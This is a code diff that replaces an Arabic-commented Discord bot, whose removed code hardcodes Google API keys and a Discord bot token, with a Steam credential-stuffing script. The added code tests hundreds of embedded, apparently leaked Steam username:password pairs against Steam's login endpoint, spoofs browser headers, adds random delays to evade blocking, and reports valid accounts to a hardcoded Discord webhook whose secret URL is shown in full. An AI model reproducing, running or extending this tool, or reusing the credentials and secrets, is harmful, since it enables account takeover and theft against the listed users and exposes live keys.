@@ -1,231 +1,613 @@
-import discord
-from discord.ext import commands
-from googleapiclient.discovery import build
-import aiohttp
-from typing import List, Dict
+import requests
+import time
+import random
 
-# إعداد البوت
-intents = discord.Intents.default()
-intents.message_content = True
-bot = commands.Bot(command_prefix='!', intents=intents)
+def validate_steam_credentials(email, password, webhook_url):
+                login_url = "https://store.steampowered.com/login/dologin/"
+                session = requests.Session()
 
-# مفاتيح API
-GOOGLE_API_KEY = "AIzaSyBTMxbCz30FGJPYoXAmjjwpUEHUKM4yxCs"
-CSE_ID = "f1200524064c54b08"
-DISCORD_TOKEN = "MTM3MjMxNTk1MDI1NDI2NDMyMA.Gcbiw3.QPJ4vVHRqM8JFaGxPlIn7wyS7xDMv-slm8XGKc"  # تأكد من إبقاء التوكن سريًا
-YOUTUBE_API_KEY = "AIzaSyACclABa9OG8C2jB8hM8RCfqYLT7YoMJfg"
+                headers = {
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+                    "Referer": "https://store.steampowered.com/login/",
+                    "Origin": "https://store.steampowered.com"
+                }
 
-# -------------------- Image Search -------------------- #
-class ImageSearchPaginator(discord.ui.View):
-    def __init__(self, search_results: List[Dict], query: str):
-        super().__init__(timeout=60)
-        self.search_results = search_results
-        self.query = query
-        self.current_page = 0
-        self.max_pages = len(search_results)
-        self.message = None
+                payload = {
+                    "email": email,
+                    "password": password,
+                    "remember_login": "false",
+                    "loginfriendlyname": ""
+                }
 
-    async def update_embed(self):
-        result = self.search_results[self.current_page]
-        title = result.get("title", "لا يوجد عنوان")
-        link = result.get("link", "")
-        image_url = result.get("link", "")
+                try:
+                    response = session.post(login_url, data=payload, headers=headers, timeout=15)
 
-        embed = discord.Embed(
-            title=title,
-            url=link,
-            description=f"النتيجة {self.current_page + 1} من {self.max_pages}",
-            color=discord.Color.blurple()
-        )
-        embed.set_image(url=image_url)
-        embed.set_footer(text=f"بحث عن: {self.query}")
+                    if "requires_twofactor" in response.text or "login_history" in response.text:
+                        send_to_discord(webhook_url, f"✅ Valid Account: {email}:{password} | Steam Guard Enabled <@1376361929957834752>")
+                        return True
+                    return False
 
-        if self.message:
-            await self.message.edit(embed=embed, view=self)
+                except Exception:
+                    return False
 
-    @discord.ui.button(label="السابق", style=discord.ButtonStyle.primary, disabled=True)
-    async def previous_button(self, interaction: discord.Interaction, button: discord.ui.Button):
-        self.current_page -= 1
-        self.next_page.disabled = False
-        if self.current_page == 0:
-            button.disabled = True
-        await interaction.response.defer()
-        await self.update_embed()
+def send_to_discord(webhook_url, message):
+                try:
+                    data = {"content": message}
+                    requests.post(webhook_url, json=data, timeout=10)
+                except Exception:
+                    pass
 
-    @discord.ui.button(label="التالي", style=discord.ButtonStyle.primary)
-    async def next_page(self, interaction: discord.Interaction, button: discord.ui.Button):
-        self.current_page += 1
-        self.previous_button.disabled = False
-        if self.current_page == self.max_pages - 1:
-            button.disabled = True
-        await interaction.response.defer()
-        await self.update_embed()
+def load_credentials():
+                # يمكنك استبدال هذا بقراءة من ملف إذا أردت
+                return [
+                            "DebonairTestedRhinoceros:Curlypuma82",
+                            "UnaccountableAbstractedApe:Pinkend50",
+                            "triha100402:hadex123",
+                            "mittie2001nencini:Ambercart36LS4D504",
+                            "SecretUnaccountableAlligator:Quicksugar50",
+                            "GrouchyThoughtfulJay:Freshfog66",
+                            "MotionlessPanoramicSpoonbill:Ivoryjackal83",
+                            "GainfulDazzlingQuelea:Pinkcard14",
+                            "StormyThoughtlessNightingale:Roundthing88",
+                            "VoicelessAloofRaven:Shortsign11",
+                            "ReflectiveAspiringBeaver:Bestgate41",
+                            "DebonairMatureStork:Poorline43",
+                            "Sy9Vu3Pj2Sb1:Lc9Th3Fu4Qt9",
+                            "TediousOffbeatMule:Whitejaguar91",
+                            "assortedhardtofindswan:Firstwool89",
+                            "BlueeyedNervousClam:Damphouse34",
+                            "SqualidUtterWildcat:Tinyflame34",
+                            "BitesizedRuddyFerret:Darkerror27",
+                            "jeebusfish:victory",
+                            "FlutteringBreakableEagle:Windyyear77",
+                            "BadHumdrumCattle:Poorwave54",
+                            "HomelessAllegedPanther:Lumpylead63",
+                            "antis86:jhgf9107",
+                            "GrotesqueWonderfulSalmon:Weirdfawn98",
+                            "HarmoniousBlackandwhiteDove:Heavystamp49",
+                            "SmoothStripedOwl:Firstchalk22",
+                            "MightySuperficialOpossum:Bentflower24",
+                            "AromaticKeenStingray:Cutetwist49",
+                            "HangingCageyDunlin:Bluerabbit74",
+                            "Dy4Dg6Fq4Xs6:deochopass",
+                            "DampFuturisticWildcat:Brownname72",
+                            "TruthfulFragileApe:Messysmoke44",
+                            "SecondhandFearfulKudu:Spicyrock29",
+                            "Bye_Thurzinn:Art18122007",
+                            "vlad1000:19881988",
+                            "HushedRainyBuffalo:Shinyyear89",
+                            "WealthyItchyCattle:Crazyrock64",
+                            "SparklingCommonKouprey:Firstwarthog21",
+                            "BlushingThickAntelope:Emptyant49",
+                            "luaayne:Murik366",
+                            "TastyCumbersomeOpossum:Bluelace31",
+                            "RudeScaryHornet:Olivebee56",
+                            "ChiefMagicalFox:Mushybulb48",
+                            "MilkyUpsetSandpiper:Muddyworm23",
+                            "CaringLoutishMosquito:Lazytime50",
+                            "rumpetera8righi979183:4UP05CJIGUL0594",
+                            "understoodunequalchough:Crazygiraffe17",
+                            "UltraDisastrousSalamander:Olivechess70",
+                            "Marchsans:Marchsans123",
+                            "nbl13:230490",
+                            "edwin_hunter1:hunteredwin363",
+                            "psiholog2288:egor_227",
+                            "nina2009righini:J639IS42EU3J29",
+                            "x8f8jzbsq74jaotqjb5q:D9GNCV0AQ3EI518",
+                            "campbell1117:people!2",
+                            "UnwrittenUsedCrow:Cutepoint80",
+                            "SimpleJaggedMongoose:Bestgame18",
+                            "excitingnostalgiccattle:Jumpysummer12",
+                            "mamichan2005:mami_chan2005",
+                            "ReconditeAbsentPanther:Giantwind56",
+                            "LamentableBroadPorcupine:Cutemind95",
+                            "StickyAmusingWhale:Smalldog59",
+                            "katiebug559:@Alexander01",
+                            "jane1995spencer:Dizzypony74OLK2H29",
+                            "TamzidSheakh0:ALLAHallah1",
+                            "unbenmideka7036:Chai@1967896",
+                            "repeat_ggbro123:pdvAwgFahw",
+                            "NervousOddZebra:Dizzywater90",
+                            "vv1ozddfswmjnd1sw1a8vs:I6YQYXYK8R68887",
+                            "hunterdevries1993:X2M0HOSMOCD684",
+                            "gergesashraffarouk15:GERGES12345gogo",
+                            "LuxuriantJaggedJay:Calmgoat50",
+                            "DeafeningWholeAlligator:Supertiger11",
+                            "meliodass544:Ka112233",
+                            "PumpedSameRam:Oldsilver49",
+                            "RomanticSoreGoldfish:Lazywish72",
+                            "caroline1982moss:Limesoda12H3DGM29",
+                            "CleverCumbersomeWombat:Kindknot81",
+                            "FestivePreciousScorpion:Curlydime41",
+                            "AwesomeUnbiasedBuffalo:Oddring11",
+                            "6dgtym7qo1d2j5zj5fthzhj:LV8DFAJKLRUS869",
+                            "unhealthylittlewildcat:Palecougar11",
+                            "qaz9071229:zaq9071229",
+                            "ScatteredUnkemptCrow:Slowpuppy58",
+                            "cricri59139:Chipper1973",
+                            "SmoothWigglyDotterel:Busyland77",
+                            "Shrinivash:awarapanA@7",
+                            "evtolstikov:Netoda60",
+                            "gnarnsick:bullshit208",
+                            "jutriki34:google.rs",
+                            "rachelpaggetti2018:Newpurple71TKJRB19",
+                            "SoggyFrailPheasant:Longamber72",
+                            "4ywtnzyh9h6v3214en719:03DTH9P9KQM2768",
+                            "UnbiasedAbusiveEel:Jollyball13",
+                            "zyl441:zylvat",
+                            "lorrytense1:J9njd2020",
+                            "kun12138kun:XDJffyLdmL",
+                            "fx9zklu4sdycfix38a5670:35GO5OLH78ZS748",
+                            "CageyObservantHyena:Coolnumber51",
+                            "UselessImpartialOpossum:Loudbread88",
+                            "james2007manzini:HT3P6X2EZ4SG13",
+                            "SolidFascinatedPenguin:Continuessalvationdolly",
+                            "san2t32zj3:khodor5529",
+                            "renguearVex:Cpk6ygv8cE57RqW9",
+                            "salgas1999:mafalda1999",
+                            "vuongduc1992:Vuongthienphuc2016",
+                            "motizhack:boat741156",
+                            "izrunk:BRO_SANANE78",
+                            "andrills0peterson149:L6FFJKERPCSS865",
+                            "abrasivebloodyfrog:Jazzyfire14",
+                            "adham202061:hellof480",
+                            "OssifiedFlippantSeal:Blackhare85",
+                            "uqjm8o3z6k4oo09fh0nbh:BANKFZC6V144803",
+                            "FadedAmazingMarten:Goodmouse87",
+                            "v2zsvftign36vg8z:Z4777YOMIDA9399",
+                            "StupidJealousRook:Freshcave21",
+                            "SoggyMinorTurtle:Messyvoice53",
+                            "beoluan:luanluan",
+                            "ticoeurx:Selecta1977",
+                            "haxor4teh1337:RuneElder33@!#$",
+                            "extrem1003:vurepo90",
+                            "jqn3yd3twkc1lzo9t1c7pf2c:7UPMF7TU2W1Q341",
+                            "fdp8zxr6zn20hs0p:QY15XCCJOP7O247",
+                            "oom321123:oomza5912",
+                            "ExcellentMundaneGoldfish:Ivorywool44",
+                            "wowtoni:NVrUJyJ1o3eMjf8q2213",
+                            "QuixoticOddBoar76:Murkynose565FZSV47",
+                            "tuantrymto:Loveuquynh1",
+                            "ermitcrabt7ristori6917:12QH753YVVM5362",
+                            "LyricalTawdrySpoonbill:Lightnumber44",
+                            "MegaSonic_0060:MegaSonic121_60",
+                            "queenmy109:astroking1$",
+                            "Franciscoml16:092zhaozl",
+                            "hero55555me:qMd6Szcx8H8kjcA",
+                            "Stickmanmapping:tejas1383",
+                            "dgoker145:dgoker00",
+                            "katherine1997mahmood:Cutemouse77PMVND73",
+                            "LiteratePastRaccoon13:Graysalmon98OWCDK28",
+                            "xwjdi37ev4prhke0kv471d0i:5Z3HKJ3L3EBA933",
+                            "t31xrdbmnm20jtk:1N22HXDZM0UP310",
+                            "MaddeningImpoliteAnt:Sillydirt56",
+                            "5AH8E2SA13GMUM38ROW3HK:Paokaraole99@",
+                            "cuentaglobal006:cuentaglobal00",
+                            "raaz051:Priyabrata6@",
+                            "punchrace:EaBlbREFrjiLKg",
+                            "tigerplaystronda:1406flavio@",
+                            "louisa2011barlow:Icyhorn857RPRN44",
+                            "steamgerada123:Silva10998",
+                            "chido1983:stilldre",
+                            "soudmarco:battlegrounds1011",
+                            "m32j9vqad99rp5aq8rkj2:GFAUPY7HK5WD505",
+                            "tl9o23ctmhazm9txaz1nf:EM3EWSJQ5YYQ522",
+                            "csepkeistvan:gepida09",
+                            "dearscintillatingstinkbug:Coldmagic70",
+                            "cooingworthlesslobster:Wisemilk19",
+                            "SteamMember1336844:Dasd32asdgbvxc!{]]ds@fa",
+                            "harrygiani21:5MSPK3K2K9DF09",
+                            "cuentaglobal004:cuentaglobal00",
+                            "dannycolzi2011:Emptypuma232G5T191",
+                            "ShaggyTroubledOstrich:Fuzzyroom31",
+                            "cdhuhrm3d2iyw5dx0xi:MMZKNNKTVG1W219",
+                            "alexisrap7:1515octubregallogorillaz",
+                            "kralesmero2:esmer0606",
+                            "Anderla7k:JPdkJWKDyyHnSeGW",
+                            "cuentaglobal007:cuentaglobal00",
+                            "4vnlgg9ajmveglzn85h:0KKCD8ISCPE8794",
+                            "u9zgzxb7tm89hlr:APLNNPKIJLJL845",
+                            "acificsardinej4wallis:IKBLKBVTKDN2469",
+                            "geoff837:francis060113",
+                            "dcgamingz2k5:1234khoiho",
+                            "pankibender866:ad369712",
+                            "ThirstySlimyCrab42:Swiftdingo89THU1C19",
+                            "4rlfze84ryz0pg1n9:IPQP6BCJJ5BY336",
+                            "sebus567:Lewandowski123456",
+                            "tymitek:kupkalol123",
+                            "JiveBlack:matthew1970",
+                            "isaiahbrice123:Hecter277",
+                            "toryanyk16:samsung29",
+                            "robert1995inoue:Ivoryred26AVF2D86",
+                            "HollowCynicalMeerkat:Bumpyface47",
+                            "lephantp3norman520942:ZW9WBHCX9TLU406",
+                            "astei7:2942025848Ab",
+                            "oct6ne:Elliebobby0709",
+                            "max17411234:maxfuckyou",
+                            "qm50as3bi4poekb:741FRORA2QD8092",
+                            "ANGLINEXXSTULM:S942001312ss",
+                            "lfegwweafekfvzq2px20:F0SDRFDH8CVR743",
+                            "OppositePatheticEel:Uglydust71",
+                            "mw5nvtj3zoy09bs6i8tsi1c8:LVRDE82LSYPX329",
+                            "LanguidMagicalApe:Badsilver87",
+                            "hareeldotatlv:76846517DELIAVICTOR",
+                            "DrearyConcernedZebra:Goodwombat80",
+                            "MaleAbusiveDolphin:Kinddoe28",
+                            "EatableIllfatedGuanaco:Scarypet59",
+                            "HushedRainyBuffalo:Shinyyear89",
+                            "zummer5555:ai7012450",
+                            "adrian_lugo23:aalp2004A",
+                            "55yicyyrnp06dj0hxvvfgl:H4E63UIO3Q0S697",
+                            "rcmq662:bJb!@135989(rF",
+                            "MushyPanoramicNightingale:Lazygoat50",
+                            "barinko24:marcelijadrugadva",
+                            "EtherealPiquantFrog:Whitelead17",
+                            "OrdinarySpikyFrog:Roundview66",
+                            "PeriodicAgonizingSeahorse:Loudmonkey41",
+                            "jeebusfish:victory",
+                            "qf19f6a8ba3fh4sbcqb05:TEWZODIUR9KZ920",
+                            "OrganicAnxiousEchidna:Muddymemory52",
+                            "LanguidMagicalApe:Badsilver87",
+                            "FurtiveBrightGrouse:Goldthing46",
+                            "StatuesqueUtopianTurkey:Tinyhamster59",
+                            "bt7eugb3fb7dem4pqvdaw9u:S2CO9UZ3ZZRO313",
+                            "lucusfreedom:jrmanu2560",
+                            "BusyLushElk:Murkyclam42",
+                            "maldonadoronnie:mom4ever",
+                            "edwindennis2012:CBAPH5TWSEK048",
+                            "VictoriousDebonairKangaroo:Oldlake35",
+                            "FaintWastefulDinosaur:Icycoal67",
+                            "GruesomeFatTrout:Freeleaf39",
+                            "sickone6:Sicdub1995",
+                            "maximv1982:357159258VmV",
+                            "FewIrateRat:Longfact33",
+                            "ta68qfq0ksvhn4hdh0co7:5GFJG2NG1LL3172",
+                            "cuentaglobal007:cuentaglobal00",
+                            "ta11qljtuxr8xu93z41167:KH3HTTHXXXR4516",
+                            "kevin_paez3:1023904933.p",
+                            "TrueStaleCobra:Lushhen85",
+                            "SqueamishSloppyOwl:Noisyrobin40",
+                            "dolliecoleman1999:Keenboat46VVCJB25",
+                            "fricanwildassv10giach:RMUW9W2AUSH1997",
+                            "shoshomo5:x100presaid",
+                            "SableWanderingCaterpillar:Blackblob97",
+                            "EminentPainstakingLark:Lazystamp57",
+                            "DashingConfusedShrew:Curlycamp83",
+                            "pck278:monday54",
+                            "PastSilkyBuffalo:Ultradust59",
+                            "fdp8zxr6zn20hs0p:QY15XCCJOP7O247",
+                            "MeaslyShinyCheetah:Lushsalt81",
+                            "WickedProudIbex:Lightrice73",
+                            "ResponsibleTangySheep:Shortflame20",
+                            "RomanticSoreGoldfish:Lazywish72",
+                            "jaelis367:274801166",
+                            "CravenPricklyBee:Thintown11",
+                            "LegalGlibWhale:Megacrown37",
+                            "CarelessFranticShark:Shinyrhino45",
+                            "4vnlgg9ajmveglzn85h:0KKCD8ISCPE8794",
+                            "armlove789zaza:092603669",
+                            "CurvyRampantWren:Superwolf33",
+                            "SameCloudyDog:Smartcougar56",
+                            "cuentaglobal008:ArribaEspana08",
+                            "SpiritualMatureBee:Smallcard40",
+                            "v2zsvftign36vg8z:Z4777YOMIDA9399",
+                            "VoicelessHaplessJellyfish:Muddystamp62",
+                            "DynamicGrubbyMouse:Keenskunk74",
+                            "ModernChemicalTapir:Greatwarthog21",
+                            "AdjoiningAwareParrot:Megarock61",
+                            "WorriedFantasticAlbatross:Bestsystem24",
+                            "Franciscoml16:092zhaozl",
+                            "pankibender866:ad369712",
+                            "cdean18:Bentleyty1#",
+                            "DepressedAbsorbedSnake:Greathelp80",
+                            "SkinnyMeekKangaroo:Ivorynewt95",
+                            "v5f2tmf62ul4lsqf3g3mhjw:EKG0WBJ2RJC4100",
+                            "harrygiani21:5MSPK3K2K9DF09",
+                            "lfegwweafekfvzq2px20:F0SDRFDH8CVR743",
+                            "LameTellingBarracuda:Shortdugong86",
+                            "qaz9071229:zaq9071229",
+                            "o1x7oc5qrk4mx33f0e6neq:WS3KUXPSFN7E364",
+                            "TartWellmadeMule:Murkychess44",
+                            "EliteRusticAlpaca:Smallcave87",
+                            "GuardedJoyousLeopard:Quicksummer35",
+                            "8suov6lyjhf1fqaps7ifio:9A5AURZI1X1S173",
+                            "UbiquitousBitesizedSwan:Lazyhorse36",
+                            "HurtFaultyGnat:Busyviolet22",
+                            "UnsightlySkillfulAardvark:Wisebread98",
+                            "Obsidegru:obside4590",
+                            "TawdryOldReindeer:Paleboo26",
+                            "drivingmarten6776:Ali112000",
+                            "ExuberantNaturalLark:Sadanimal76",
+                            "RacialSilentLyrebird:Redcat42",
+                            "PumpedSameRam:Oldsilver49",
+                            "FreshJuvenileQuelea:Loudwhite40",
+                            "JiveBlack:matthew1970",
+                            "0283gabwarjgkda7:1720mika",
+                            "UsedDeeplyYak:Hugepurple85",
+                            "cuentaglobal012:cuentaglobal01",
+                            "sebus567:Lewandowski123456",
+                            "CooingWorthlessLobster:Wisemilk19",
+                            "AliveAshamedCrocodile:Redsun36",
+                            "MaterialBrokenGorilla:Swiftgrip61",
+                            "oct6ne:Elliebobby0709",
+                            "uzytkownik9669:Bartus9226",
+                            "SpectacularNormalWasp:Lusheye45",
+                            "isaiahbrice123:Hecter277",
+                            "ExtralargeVulgarOctopus:Windyheat87",
+                            "BigDearHedgehog:Graykoala58",
+                            "ben120561111:BBEENN1346791973",
+                            "chido1983:stilldre",
+                            "maks12hala1:(ja)12345",
+                            "TastyMoldyBuffalo:Murkynumber35",
+                            "EatableTremendousEland:Slimycircle18",
+                            "StupidComplexOstrich:Muddymusic44",
+                            "QuickestHeartbreakingMonkey:Ivoryengine71",
+                            "nzeo5zjgz6aj56hdplgcr:SOK1OGEA2K3O821",
+                            "xwjdi37ev4prhke0kv471d0i:5Z3HKJ3L3EBA933",
+                            "CompleteGruesomeRail:Bentmagic25",
+                            "AlikeBreakableOtter:Uglyland54",
+                            "UniqueLopsidedDragonfly:Darksystem42",
+                            "NebulousRobustEmu:Olivewinter10",
+                            "J0e_yousse:you152008Y",
+                            "xuzhen5214:iwVBhhfswC",
+                            "Mariyappanvt:mari@1234",
+                            "yoshuar4:Lolkun12",
+                            "elong8600:Midnight6598",
+                            "berkt07:mertada123",
+                            "kousb255:Chzaza25283033",
+                            "pudinneko100:bernandita400",
+                            "pisagoruckeni:05469175239Aa",
+                            "sharouski:Sasha45908",
+                            "sharkman1168:achatz1168",
+                            "CAIS521:NUBJXePQxD",
+                            "juanbee3:Ch2828512022",
+                            "muhammedcan00161:muhkul159",
+                            "aocaa1267:qazqaz123@#",
+                            "stickyman69:floci1234567",
+                            "junjun888666733:Xiaohejiaoao78965",
+                            "kikula221:kikula112",
+                            "tabotroc125:Toan@15112004",
+                            "viethoang14299:Hoangvtvn14299",
+                            "obliviuslegios:blastoise777",
+                            "min1119830557:NrmSmZGuWp",
+                            "alexistrotta2005:Pollito472020",
+                            "health12310:UnmameLCXJ",
+                            "jw1lb2xx2xy4:1zXbSpWP09",
+                            "nnnn121894:Nnnn112$",
+                            "qig42tjwrd7d:@MOaman123",
+                            "lemus911:Sebastian2020*",
+                            "tguch30759:Mlodszylubiwdupe123",
+                            "linhtmt266:0399859358",
+                            "invl66529:ghadab1982@",
+                            "Keyshop_Assassins:Passcode123p",
+                            "fvcvh93182:bdee74135J",
+                            "cedricd16:Cedric1982*",
+                            "hakanfe50:163019072001",
+                            "eVaKFrag:Dylankiller84",
+                            "apmapex:s125074075",
+                            "tsionqewv:KDUNC12@",
+                            "lyy_1004:aassdd5013@@",
+                            "pshvt62437:nYjgX5mffevK",
+                            "RaggedSaltyTrout:Freepart24",
+                            "furzu5600:Oao124309320",
+                            "mcdragonxxx:ashu20@09",
+                            "4tengame10:1234ten4ten",
+                            "sharkman1168:achatz1168",
+                            "CAIS521:NUBJXePQxD",
+                            "mariyappanvt:mari@1234",
+                            "juanbee3:Ch2828512022",
+                            "muhammedcan00161:muhkul159",
+                            "aocaa1267:qazqaz123@#",
+                            "stickyman69:floci1234567",
+                            "AboardHulkingSandpiper:Smartwool43",
+                            "junjun888666733:Xiaohejiaoao78965",
+                            "kikula221:kikula112",
+                            "tabotroc125:Toan@15112004",
+                            "viethoang14299:Hoangvtvn14299",
+                            "obliviuslegios:blastoise777",
+                            "min1119830557:NrmSmZGuWp",
+                            "alexistrotta2005:Pollito472020&",
+                            "ivik96600:Aass@@1020304050",
+                            "ScrawnyUnsuitableMouse:Bravetwist82",
+                            "xcg56225171:eoBeyeJWXc",
+                            "nnnn121894:Nnnn112$",
+                            "sharkman1168:achatz1168",
+                            "123rhdwn:rhdwn610902",
+                            "hqvp97016:Jm9Nr1Qy1Xz86t",
+                            "vincecubels:akocvince",
+                            "jicataaabbb:tezoro323",
+                            "premium_software1113:ajtgjm1975",
+                            "wmuakj0u71:43efr8jmdTWYW",
+                            "iyghe69934:XKAmssEW2jDq",
+                            "Joaquim1234520:Asenha123",
+                            "islamoooooooo:IscO28062008",
+                            "perze50:Cashman20",
+                            "qkknl98841:ffars90600",
+                            "yxdw249977:1dhmj66j",
+                            "mqopu26681:pkrv45843I",
+                            "home_c7:edwin_c7_n14",
+                            "aykanam:mahdihadi1",
+                            "il2ol8kp5fc0:Uj5Ih3Jo5Lm7",
+                            "tigerland86:Mohsen@1365",
+                            "Ha5Lf1Mz1Ce1:Au4Yt1Xp9Am4",
+                            "self_righteousl34:h=<#Bkn<Y27bhKD",
+                            "jw1lb2xx2xy4:1zXbSpWP09",
+                            "xqecz21780:lluw00324B",
+                            "ohmzakung5:thanaohm555ZA",
+                            "mos12181994:Moss112$",
+                            "Dannny26Ralte:Savekeys56789",
+                            "marekzito22:DDEZgxz08PNF",
+                            "88ZIESUMPWAHVILOCU1989:Beanbop123",
+                            "RaizoPC:29082005f",
+                            "aymanemaher:mahermrdx123@",
+                            "z06l84de:rRVYYL3fR1F1",
+                            "GrubbyExultantBashfulBadger:DialysisfirprobationB2",
+                            "naruto89036:Juanchi333",
+                            "yyfxf448496:DD218177",
+                            "rpsss51921:flo220011",
+                            "ajf19851:ajf95415004",
+                            "yyReplyy:Ichbins007!",
+                            "szmou78917:Steamgle235",
+                            "yyyy12345678912:GM7TZ9A5997Y",
+                            "evlampia7:get5y6u7iythrge54y6",
+                            "b433374115:z479676173",
+                            "zeuspunx:anarchy",
+                            "goding_goood:nasj1107",
+                            "lnyfd334aouauiqcwjwu71p:DW3EVQIJWRKE089",
+                            "karlu5:5867555Daboy",
+                            "lesske11:gustavomito12@1",
+                            "14Viti:141210Viti",
+                            "babin20089330:Hacker@2008",
+                            "gabsalsem:gabriel2502",
+                            "etjha977725:EoIkO473120",
+                            "Dk4Lq8Bk7Od2:loknath1234",
+                            "LOUTAV:comboio123",
+                            "jenyaelyutin86:brR016lxtWa08EpA",
+                            "xuzhen5214:iwVBhhfswC",
+                            "JOe_yousse:you152008Y",
+                            "Mariyappanvt:mari@1234",
+                            "yoshuar4:Lolkun12",
+                            "elong8600:Midnight6598!",
+                            "berkt07:mertada123",
+                            "kousb255:Chzaza25283033",
+                            "pudinneko100:bernandita400@",
+                            "pisagoruckeni:05469175239Aa",
+                            "sharouski:Sasha45908",
+                            "sharkman1168:achatz1168",
+                            "CAIS521:NUBJXePQXD",
+                            "mariyappanvt:mari@1234",
+                            "juanbee3:Ch2828512022",
+                            "muhammedcan00161:muhkul159",
+                            "aocaa1267:qazqaz123@#",
+                            "stickyman69:floci1234567",
+                            "AboardHulkingSandpiper:Smartwool43",
+                            "junjun888666733:Xiaohejiaoao78965",
+                            "kikula221:kikula112",
+                            "tabotroc125:Toan@15112004 41",
+                            "viethoang14299:Hoangvtvn14299",
+                            "obliviuslegios:blastoise777",
+                            "min1119830557:NrmSmZGuWp",
+                            "alexistrotta2005:Pollito472020&",
+                            "health12310:UnmameLCXJ",
+                            "jw1lb2xx2xy4:1zXbSpWP09",
+                            "nnnn121894:Nnnn112$",
+                            "qig42tjwrd7d:@MOaman123",
+                            "filipgod5:GetclappedEZEZ1",
+                            "Nichcl14:matkhau14",
+                            "taing021:Ngtai0509",
+                            "cltaing36:Ngtai010",
+                            "iamgoodguy5:4949892N",
+                            "amirali1234569:amirlili9999",
+                            "pichet0077:Joemod02",
+                            "cltaing31:Ngtai0509",
+                            "nichcl76:matkhau76",
+                            "cltaing40:Ngtai011",
+                            "cltaing27:Ngtai0509",
+                            "fcji87496:Wo3Aw1Dd2Cl06t",
+                            "Dion_2006:0437338483",
+                            "uokkaf2lefvre25038898:09HG68YB9KU9475",
+                            "kennethshort:Gregjul.2015",
+                            "apewithnobrakes1:@Alann060208",
+                            "nichcl70:matkhau70",
+                            "rylannnnnnnnnewww:Rylanis#1",
+                            "tremendous275:Jaden1375",
+                            "cltaing37:Ngtai010",
+                            "wfy666777:Marek112299",
+                            "nichcl54:matkhau54",
+                            "Shappt88:152333ab",
+                            "uraml04692:Jerry0510!",
+                            "85playboy:3Ferrarri3",
+                            "Nichcl16:matkhau16",
+                            "nmej90122:dbwjdgh12",
+                            "nichcl56:matkhau56",
+                            "gindozina:eZ#3RQEw",
+                            "nichcl49:matkhau49",
+                            "isdofficial:Iqbals0405",
+                            "jrew24429:C7iyyUpgG4ArBRb",
+                            "nichcl75:matkhau75",
+                            "rizechill07:Enjoylife07",
+                            "cltaing25:Ngtai0509",
+                            "nichcl74:matkhau74",
+                            "yvthw44810:swkw84604I",
+                            "dbjmm46528:CuentaSteamEAFC21762",
+                            "Nichcl15:matkhau15",
+                            "csey59444:On0Sc1Fz5Ka36t",
+                            "gryosgopip5:5Mateo223",
+                            "bxl1bo3tq:Iiyz64T9tr",
+                            "Taing015:Ngtai003",
+                            "Nichcl95:matkhau95",
+                            "Taing011:Ngtai003",
+                            "nichcl48:matkhau48",
+                            "x507hg23:DD1432174",
+                            "ht5pj5sx7nn0:konopiska80",
+                            "tbjx85895:eHMX1010",
+                            "saadz123:394528..",
+                            "id8888889:zLskVTpLsN",
+                            "eula1983huang:Windywood99OLXOE35",
+                            "nichcl51:matkhau51",
+                            "taing022:Ngtai0509",
+                            "taing016:Ngtai004",
+                            "mikenethan:0918678594121123",
+                            "qy80VAzy:zg53VTHX",
+                            "nichcl42:matkhau42",
+                            "Nichcl13:matkhau13",
+                            "cltaing22:Ngtai0509",
+                            "nichcl40:matkhau40",
+                            "zzfr89208:HqrTc7XoTs",
+                            "nichcl59:matkhau59",
+                            "owtj402241:HxjP1466",
+                            "cltaing26:Ngtai0509",
+                            "makarov20231:0993038366klm9",
+                            "eternal13377:Yahya666.0",
+                            "cltaing35:Ngtai010",
+                            "dumrnm1270:Divine@1785",
+                            "Blackcellbb:Moloto12",
+                            "gianstorelv7:gian321321",
+                            "cltaing29:Ngtai0509",
+                            "omopromsak86:Omoone12345",
+                            "Taing014:Ngtai003",
+                            "nd43lGfz:oe26YULX",
+                            "re4adapgx1:Tropagames11258",
+                            "p4rks405:lUJhejMo",
+                            "lvcnx11549:kphmqu7tu1",
+                            "hajiute:Hamy888@R",
+                            "Dl9Bj3Qa0Iz8:hassene11hassene",
+                            "Johnpaul2300:Happiness5050",
+                            "taing019:Ngtai004",
+                            "oliveira8784:@Menoexibido",
+                            "jtlyj80055:EE8347048",
+                            "2480713007:0gigkYFoUg",
+                            "nichcl44:matkhau44",
+                            "WittyAddictedOpossum:Scaryiguana92",
+                            "cltaing39:Ngtai011",
+                            "nichcl57:matkhau57",
+                            "fjlo38681:Ci1Pw6Md8Ms8",
+                            "nichcl53:matkhau53",
+                            "jakehero5:eliana2001xd",
+                            "nichcl78:matkhau78",
+                            "nichcl73:matkhau73",
+                            "atila_00001:23atilaTOPO",
+                            "CreepyGamingYT5:Quackity"
+                ]
 
+def main():
+                webhook_url = "https://discord.com/api/webhooks/1376361948228227125/mzAP9UpqVnEn6hWZY3q5uikBkf7OPmk5z1ty2EugrUB-UaBF25Qm3dnyhgk9EMSaMxyl"  # استبدل هذا بالويب هوك الحقيقي
 
-@bot.command(name="image", help="Search Google Images for any topic")
-async def image(ctx: commands.Context, *, query: str):
-    try:
-        service = build("customsearch", "v1", developerKey=GOOGLE_API_KEY)
-        res = service.cse().list(
-            q=query,
-            cx=CSE_ID,
-            searchType="image",
-            num=10
-        ).execute()
-        items = res.get('items', [])
+                credentials = load_credentials()
 
-        if not items:
-            await ctx.send("لم يتم العثور على صور.")
-            return
+                for cred in credentials:
+                    try:
+                        if ":" not in cred:
+                            continue
 
-        paginator = ImageSearchPaginator(items, query)
-        msg = await ctx.send("جارٍ جلب نتائج الصور...", view=paginator)
-        paginator.message = msg
-        await paginator.update_embed()
+                        email, password = cred.split(":", 1)
+                        validate_steam_credentials(email, password, webhook_url)
 
-    except Exception as e:
-        await ctx.send(f"حدث خطأ: {str(e)}")
+                        # تأخير عشوائي بين 10-20 ثانية لتجنب الحظر
+                        time.sleep(10 + random.random() * 10)
 
-# -------------------- Define -------------------- #
-@bot.command(name="define", help="Get the definition of a word")
-async def define(ctx, *, word: str):
-    url = f"https://api.dictionaryapi.dev/api/v2/entries/en/{word}"
-    async with aiohttp.ClientSession() as session:
-        async with session.get(url) as response:
-            if response.status != 200:
-                await ctx.send(f"لم يتم العثور على تعريف للكلمة '{word}'.")
-                return
-            data = await response.json()
+                    except Exception:
+                        continue
 
-    definitions = data[0].get("meanings", [])
-    if not definitions:
-        await ctx.send("لم يتم العثور على تعريفات.")
-        return
-
-    embed = discord.Embed(title=f"تعريف كلمة {word}", color=discord.Color.green())
